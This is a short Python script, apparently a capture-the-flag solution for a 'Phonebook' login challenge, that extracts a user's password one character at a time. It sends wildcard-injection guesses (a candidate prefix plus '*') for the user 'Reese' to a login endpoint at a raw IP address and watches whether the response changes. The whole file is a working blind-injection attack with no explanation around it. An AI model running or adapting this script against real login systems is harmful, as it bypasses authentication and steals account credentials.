import requests
import string

letters_and_num = string.ascii_letters + string.digits + "{}_"
  
# api-endpoint
URL = "http://159.65.27.79:32071/login"
  

password = ""



while(1):
	temp_pass = ""
	for char in letters_and_num:
		temp_pass = password + "{}*".format(char)
		
		PARAMS = {'username':'Reese', 'password':temp_pass}
		r = requests.post(url = URL, data = PARAMS)

		if "Phonebook - Login" not in r.text:
			password = temp_pass[:-1]
			print(password)
			